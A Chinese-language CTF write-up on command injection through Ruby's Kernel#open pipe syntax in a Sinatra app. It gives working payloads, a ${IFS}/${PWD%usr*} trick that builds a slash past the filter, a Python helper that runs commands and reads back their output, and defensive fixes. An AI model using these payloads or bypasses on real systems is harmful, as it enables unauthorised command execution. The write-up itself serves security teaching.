---
title: "CTF Web 基础三题（二）—— Ruby open 管道命令执行"
date: "2026-10-23"
tags: ["Security", "CTF", "Web"]
excerpt: "Ruby 的 open() 遇到 | 开头的字符串会执行命令；过滤挡了 / 和 ..，却没挡 | 和 >。再用 ${PWD%usr*} 造出斜杠，两步读回 flag。"
series: "ctf-web-basics"
seriesOrder: 2
---

> 题目环境：Ruby 2.7.4 + Sinatra，附件里只有一个 `app.rb`。
> 最终 flag：`ctfhub{7f6fe3eef56c600e0d06e794}`

## 一、一句话考点

**Ruby 的 `open()` 遇到以 `|` 开头的字符串会当命令执行；过滤只挡了 `/` 和 `..`，却没挡 `|` 和 `>`。**

## 二、源码

```ruby
require 'sinatra'
require 'digest'
require 'base64'

get '/' do
  open("./view/index.html", 'r').read()
end

post '/upload' do
  unless params[:file] && params[:file][:tempfile] && params[:file][:filename] &&
         params[:file][:filename].split('.')[-1] == 'png'
    return "<script>alert('error');location.href='/upload';</script>"
  end
  begin
    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + '.png'
    open(filename, 'wb') { |f|
      f.write open(params[:file][:tempfile],'r').read
    }
    "Upload success, file stored at #{filename}"
  rescue
    'something wrong'
  end
end

post '/convert' do
  begin
    unless params['file']
      return "<script>alert('error');location.href='/convert';</script>"
    end
    file = params['file']
    unless file.index('..') == nil && file.index('/') == nil && file =~ /^(.+)\.png$/
      return "<script>alert('dont hack me');</script>"
    end
    res = open(file, 'r').read
    headers 'Content-Type' => "text/html; charset=utf-8"
    "var img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64," +
      Base64.encode64(res).gsub(/\s*/, '') + "\";\n"
  rescue
    'something wrong'
  end
end
```

真正有问题的只有一行：`res = open(file, 'r').read`，`file` 完全来自用户。

## 三、漏洞点：`Kernel#open` 的管道语法

Ruby 的 `Kernel#open` 不是单纯的「打开文件」，它兼容 `IO.popen` 的写法：

```ruby
open("/etc/passwd")      # 读文件
open("|id")              # 执行 id，返回它的 stdout
open("|id > /tmp/x")     # 执行 id，输出重定向到 /tmp/x
```

只要字符串**第一个字符是 `|`**，后面整串就交给 shell。这是一个非常经典、也非常危险的「便利函数」。

## 四、三个过滤条件，如何同时满足

```ruby
unless file.index('..') == nil && file.index('/') == nil && file =~ /^(.+)\.png$/
```

| 条件 | 含义 |
|---|---|
| 不含 `..` | 防目录穿越 |
| 不含 `/` | 防绝对路径 |
| 必须以 `.png` 结尾 | 只让转换 png |

而 `|`、`>`、`$`、`{` `}` 全都不在限制里。所以：

```
file=|id>o.png
```

- 以 `|` 开头 → 命令执行
- `>o.png` → 把 stdout 写进当前目录的 `o.png`
- 整串以 `.png` 结尾 → 正则通过
- 没有 `/`、没有 `..` → 另外两条也通过

## 五、没有回显怎么办

`open(file, 'r').read` 的返回值会被 base64 编码进响应，所以**只要有回显就直接读**；但命令的输出被我们重定向走了，`read` 读到的是空。

所以是两步：

1. `file=|id>o.png` —— 先执行，落盘
2. `file=o.png` —— 再让程序读这个文件，base64 会带回响应

响应格式固定：

```
var img = document.createElement("img");
img.src= "data:image/png;base64,<BASE64>";
```

取 `base64,` 后面的内容解码即可。

## 六、读 `/flag` 但 payload 不能有 `/`

cwd 是 `/usr/src`，flag 在 `/flag_20526`。payload 里不能出现 `/`，怎么办？

**用 shell 的参数展开自己造一个 `/`：**

```sh
${PWD%usr*}     # PWD=/usr/src，去掉最短匹配后缀 usr* → "/"
```

所以：

```
file=|cat${IFS}${PWD%usr*}flag_20526>o.png
```

| 片段 | 作用 |
|---|---|
| `${IFS}` | 空格（默认值 ` \t\n`） |
| `${PWD%usr*}` | `/` |
| `>o.png` | 落盘，顺便满足 `.png` 后缀 |

整个字符串里**一个斜杠都没有**，但 shell 展开后就是 `cat /flag_20526`。

## 七、完整利用流程

```python
def run(cmd):
    post('convert', {'file': '|' + cmd + '>o.png'})   # 执行并落盘
    r = post('convert', {'file': 'o.png'})            # 读回
    return base64.b64decode(re.search(r'base64,([A-Za-z0-9+/=]*)', r).group(1))
```

```python
run('id')                                   # uid=0(root)
run('ls${IFS}${PWD%usr*}')                  # 根目录 → flag_20526
run('cat${IFS}${PWD%usr*}flag_20526')       # ctfhub{7f6fe3eef56c600e0d06e794}
```

## 八、踩过的坑

**PowerShell 的 here-string 会插值 `$`。**

第一版脚本用 `@"..."@` 包 Python 代码，PowerShell 先把 `${IFS}`、`${PWD%usr*}` 当自己的变量展开成空串，实际执行的是 `ls>o.png`——看起来「命令执行没成功」，其实是被自己的 shell 吃了。

修法：用 `write` 工具把脚本落盘再跑，或者用单引号 here-string `@'...'@`。

## 九、防御

```ruby
# 1. 不要用 Kernel#open 打开用户输入
File.open(path, 'rb') { |f| f.read }

# 2. 如果只允许读特定目录
base = '/app/uploads'
full = File.expand_path(File.join(base, file))
raise 'bad path' unless full.start_with?(base + '/')

# 3. 只允许 png 且校验真实类型
raise 'not png' unless File.binread(full, 8) == "\x89PNG\r\n\x1a\n"
```

核心：**`open` / `send` / `eval` / `system` 这类「万能函数」，永远不要直接吃用户输入。**

## 十、迁移：同类题怎么认

| 语言 | 危险写法 | 触发条件 |
|---|---|---|
| Ruby | `open(x)`、`IO.read(x)`、`send(x)` | `x` 以 `\|` 开头 |
| PHP | `system`、`exec`、`include`、`eval` | 用户可控 |
| Python | `eval`、`pickle.loads`、`os.system` | 用户可控 |

另外记住这个思路：**过滤只检查字符串，不检查展开后的结果**。`${IFS}`、`${PWD%...}`、`$'\x2f'` 都是同一类绕过。
